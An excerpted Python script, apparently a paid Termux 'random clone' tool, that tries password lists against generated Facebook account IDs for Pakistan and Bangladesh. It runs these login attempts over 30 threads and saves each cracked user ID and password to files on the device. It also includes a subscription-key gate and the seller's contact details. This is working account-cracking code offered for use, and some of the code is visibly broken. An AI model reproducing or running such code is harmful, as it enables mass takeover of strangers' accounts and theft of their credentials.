...
\033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐌𝐑 𝐇𝐀𝐍𝐃𝐒𝐎𝐌𝐄
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mHANDSOME-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mHANDSOME-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : MR-HANDSOME")
    print("\t  Fb page  : Handsome Turmex Cammands")
    print("\t  Github   : Handsome")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To HANDSOME Tool ....")
        time.sleep(2)
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=HANDSOME"
        print("\n\t     [ Hello User ]\n")
        print(" This is paid tool you need subscription to use")
        print(" for buy subscription press enter an msg")
        print(" to HANDSOME TURMEX COMMANDS fb group and your key")
        print(" otherwise msg on this whatsapp 03482593139 \n")
        print(" Copy your Key :",gre,f_token+_help,wit,"\n")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100083670797943")
        exit()
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_HANDSOME_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    print(f"{WHITE}══════════════════════════════════════════════════════")
    print(f"{WHITE}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{WHITE}[02] {WHITE}RANDOM CLONE BD  M1")
    print(f"{WHITE}[03] {WHITE}OWNER FB ID")
    print(f"{WHITE}[04] {WHITE}OWNER WHATSAPP")
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100083670797943");xyz()
    elif hamii in ["4","04"]:
        os.system("xdg-open https://wa.me/+923482593139")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {GREEN}"+tl+" ~> [ FASTEST]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN ")
        print(f" {WHITE}NUMBER YOU PUT        : {GREEN}"+code)
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio HANDSOME_OK.mp3")
                print('\r\033[1;32m[HANDSOME-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/HANDSOME-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio HANDSOME_2F.mp3")
                    print('\r\033[1;34m[HANDSOME-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/HANDSOME-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio HANDSOME_CP.mp3")
                    print(f'\r\033[1;30m[HANDSOME-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/HANDSOME-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HANDSOME] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def password2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {GREEN}"+tl+" ~> [ FAST ]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN ")
        print(f" {WHITE}NUMBER YOU PUT        : {GREEN}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{GREEN} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def password5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {GREEN}"+tl+" ~> [ SLOW ]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN")
